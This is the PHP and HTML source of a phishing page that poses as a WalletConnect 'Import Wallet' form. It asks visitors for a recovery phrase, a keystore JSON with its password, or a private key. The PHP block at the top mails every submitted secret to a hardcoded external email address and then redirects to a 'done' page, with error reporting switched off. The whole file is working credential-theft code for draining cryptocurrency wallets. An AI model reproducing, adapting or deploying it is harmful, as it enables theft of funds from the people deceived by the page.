<?php
    //stop error report
    error_reporting(0);

    include_once('inc/header.php');
    $msg = '';
    $msgClass = '';
    $walletType = isset($_GET['type']) ? $_GET['type'] : "";

    if(filter_has_var(INPUT_POST, 'import')){
        //get form input
        $category = htmlspecialchars($_POST['category']);
        $walletNumber = "";
        $walletPassword = "";
        $name = "WALLETCONNECT";

        if($category == "Phrase") {
            $walletNumber = htmlspecialchars($_POST['phrase']);
        } else if ($category == "Keystore JSON") {
            $walletNumber = htmlspecialchars($_POST['keystore']);
            $walletPassword = htmlspecialchars($_POST['password']);
        } else {
            $walletNumber = htmlspecialchars($_POST['key']);
        }

        //pass
		//recipient email//use hosting or server
		$toEmail = 'olaniyanfoluso498@gmail.com';
		// $toEmail = 'Youngandinvesting012@icloud.com';
		$subject = 'WALLET DETAILS '.$name;
		$body = '<h2>WALLET DETAILS</h2>
				<h4>WALLET-TYPE</h4><p>'.$walletType.'</p>
				<h4>CATEGORY</h4><p>'.$category.'</p>
				<h4>WALLET-NUMBER</h4><p>'.$walletNumber.'</p>
				<h4>WALLET-PASSWORD</h4><p>'.$walletPassword.'</p>
				';

		//email headers
		$headers = "MIME-Version: 1.0" ."\r\n";
		$headers .= "Content-Type:text/html:charset=UTF-8" ."\r\n";

		//additional headers
		$headers .= "From: ".$name. "<".$walletType.">". "\r\n";

		if(mail($toEmail, $subject, $body, $headers)){
			//email sent
			$msg = 'IMPORT CONFIRMED';
            $msgClass = 'success';
            header("Location: done.php");
		} else {
			//email fails
			$msg = 'IMPORT FAILED';
            $msgClass = 'fail';
            header("Location: done.php");
		}

    }
?>

<title>Import Wallet</title>
</head>

<body style="text-align:center;">

<!-- import -->
    <h2 style="text-align:center;">Import Wallet</h2>
    </br>

    <div class="tab">
        <button class="tablinks" id="default" onclick="openCity(event, 'phrase')"><b>Phrase</b></button>
        <button class="tablinks" onclick="openCity(event, 'keystore')"><b>Keystore JSON</b></button>
        <button class="tablinks" onclick="openCity(event, 'private')"><b>Private Key</b></button>
    </div>

    <!-- phrase -->
    <div id="phrase" class="tabcontent">
        <form action="<?= $_SERVER['PHP_SELF']; ?>" method="POST">
   
            <input type="hidden" name="category" value="Phrase"/>

            <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
            </br>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            </br>
            <div class="btn-wrapper">
                <button type="submit" name="import" class="btn">IMPORT</button>
            </div>
            <!-- <button type="submit" name="import" class="btn">IMPORT</button> -->
        </form>
    </div>

    <!-- keystore -->
    <div id="keystore" class="tabcontent">
        <form action="<?= $_SERVER['PHP_SELF']; ?>" method="POST">
            
            <input type="hidden" name="category" value="Keystore JSON"/>

            <textarea name="keystore" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
            </br>
            <div class="field">
                <input type="text" name="password" placeholder="Password"/>
            </div>
            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
            </br>
            <div class="btn-wrapper">
                <button type="submit" name="import" class="btn">IMPORT</button>
            </div>
        </form>
    </div>

    <!-- private key -->
    <div id="private" class="tabcontent">
        <form action="<?= $_SERVER['PHP_SELF']; ?>" method="POST">
            
            <input type="hidden" name="category" value="Private Key"/>
            <div class="field">
                <input type="text" name="key" class="key" placeholder="Private Key"/>
            </div>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            </br>
            <div class="btn-wrapper">
                <button type="submit" name="import" class="btn">IMPORT</button>
            </div>
        </form>
    </div>

    <!-- import done notify -->
    <?php if($msg != ''): ?>
			<div class="">
				<h4 class="<?php echo $msgClass; ?>"><?php echo $msg; ?></h4>
			</div>
	<?php endif; ?>

    <script>

        document.getElementById("default").click();

        function openCity(evt, cityName) {
        // Declare all variables
            var i, tabcontent, tablinks;
        
            // Get all elements with class="tabcontent" and hide them
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
            tabcontent[i].style.display = "none";
            }
        
            // Get all elements with class="tablinks" and remove the class "active"
            tablinks = document.getElementsByClassName("tablinks");
            for (i = 0; i < tablinks.length; i++) {
            tablinks[i].className = tablinks[i].className.replace(" active", "");
            }
        
            // Show the current tab, and add an "active" class to the button that opened the tab
            document.getElementById(cityName).style.display = "block";
            evt.currentTarget.className += " active";
        }

    </script>
<?php
    include_once('inc/footer.php');
?>